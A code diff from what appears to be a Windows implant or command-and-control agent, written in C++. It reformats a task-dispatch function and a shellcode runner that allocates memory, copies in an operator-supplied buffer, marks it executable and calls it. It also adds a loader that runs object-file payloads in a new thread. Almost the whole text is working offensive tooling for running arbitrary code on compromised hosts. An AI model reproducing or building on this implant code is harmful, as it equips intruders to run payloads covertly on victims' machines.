@@ -157,14 +157,12 @@ namespace Memory {
     }
 
     namespace Execute {
+        BOOL ExecuteCommand(_parser& parser) {
+            _command cmd = {};
+            uintptr_t command = {};
 
-        BOOL ExecuteCommand(_parser &parser) {
-
-            _command cmd        = { };
-            uintptr_t command   = { };
-
-            const auto cmd_id   = Parser::UnpackDword(&parser);
-            bool success        = true;
+            const auto cmd_id = Parser::UnpackDword(&parser);
+            bool success = true;
 
             if (cmd_id == NOJOB) {
                 goto defer;
@@ -172,27 +170,26 @@ namespace Memory {
 
             x_assertb(command = Commands::GetCommandAddress(cmd_id));
 
-            cmd = (_command) RVA(PBYTE, Ctx->base.address, command);
+            cmd = (_command)RVA(PBYTE, Ctx->base.address, command);
             cmd(&parser);
 
         defer:
             return success;
         }
 
-        BOOL ExecuteShellcode(const _parser &parser) {
+        BOOL ExecuteShellcode(const _parser& parser) {
+            void (*exec)() = {};
+            void* address = {};
 
-            void (*exec)()  = { };
-            void *address   = { };
-
-            size_t size     = parser.Length;
-            bool success    = true;
+            size_t size = parser.Length;
+            bool success = true;
 
             x_ntassertb(Ctx->nt.NtAllocateVirtualMemory(NtCurrentProcess(), &address, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
 
             x_memcpy(address, parser.buffer, parser.Length);
             x_ntassertb(Ctx->nt.NtProtectVirtualMemory(NtCurrentProcess(), &address, &size, PAGE_EXECUTE_READ, nullptr));
 
-            exec = (void(*)()) address;
+            exec = (void(*)())address;
             exec();
 
             x_memset(address, 0, size);
@@ -200,6 +197,26 @@ namespace Memory {
         defer:
             if (address) { Ctx->nt.NtFreeVirtualMemory(NtCurrentProcess(), &address, &size, MEM_FREE); }
             return success;
+        }
+
+        VOID LoadObject(_parser parser) {
+            // todo: maybe loadable objects in remote processes??
+
+            _injection_ctx inject = {};
+            _coff_params* params = (_coff_params*)x_malloc(sizeof(_coff_params));
+
+            params->entrypoint = Parser::UnpackString(&parser, (uint32_t*)&params->entrypoint_size);
+            params->data = Parser::UnpackBytes(&parser, (uint32_t*)&params->data_size);
+            params->args = Parser::UnpackBytes(&parser, (uint32_t*)&params->args_size);
+            params->cache = Parser::UnpackBool(&parser);
+            params->task_id = Ctx->session.current_taskid;
+
+            inject.parameter = params;
+            Ctx->threads++;
+
+            if (!Threads::CreateUserThread(NtCurrentProcess(), true, (void*)Objects::CoffThread, params, nullptr)) {
+                // get error
+            }
         }
     }
 }
